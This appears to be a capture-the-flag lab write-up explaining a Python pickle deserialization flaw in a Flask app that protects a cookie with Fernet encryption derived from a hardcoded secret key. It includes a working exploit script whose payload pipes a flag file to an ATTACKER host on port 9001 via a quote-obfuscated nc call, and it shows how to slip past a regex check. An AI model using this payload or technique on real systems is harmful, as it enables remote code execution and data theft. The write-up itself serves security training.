# Skills Assessment I — HTBrain (Python Pickle + Fernet)

## Vulnerability

`app.py` stores a Fernet-encrypted, pickled dict in the `notes` cookie. On load, it decrypts and calls `pickle.loads()`. Two validation checks surround the call:

1. **Regex**: `re.search('Title.*?Text.*?Date', str(serialized))` — checks decrypted bytes before unpickling
2. **Key check**: `[*dictionary] != ['Title', 'Text', 'Date']` — checks result after unpickling

## Key Material

Hardcoded in `app.py`:
```python
app.config['SECRET_KEY'] = '@s3cur3P!ck13K3y'
```

Fernet key derived as:
```python
key = base64.b64encode(hashlib.sha256(SECRET_KEY.encode()).digest()[:32])
```

## Bypass Strategy

- `__reduce__` RCE fires during `pickle.loads()` — before the key check, so a 500 doesn't matter
- Regex bypass: append `b' Title Text Date'` after the pickle STOP opcode (pickle ignores trailing bytes)
- `str(bytes)` preserves the literal words "Title", "Text", "Date" so the regex matches

## Exploit

```python
import base64, hashlib, pickle, os
from cryptography.fernet import Fernet

SECRET_KEY = '@s3cur3P!ck13K3y'
key = base64.b64encode(hashlib.sha256(SECRET_KEY.encode()).digest()[:32])
f = Fernet(key)

class RCE:
    def __reduce__(self):
        return os.system, ("cat flag.txt | n''c ATTACKER 9001",)

payload = pickle.dumps(RCE()) + b' Title Text Date'
print(base64.b64encode(f.encrypt(payload)).decode())
```

Submit as `notes` cookie on `GET /`.

## Key Notes

- Encryption with a known/derivable key is not a defense against deserialization attacks — the attacker re-encrypts their own payload
- Regex on serialized bytes is bypassable by appending the expected strings after the STOP opcode
- `pickle.loads` ignores bytes after the `.` (STOP) opcode
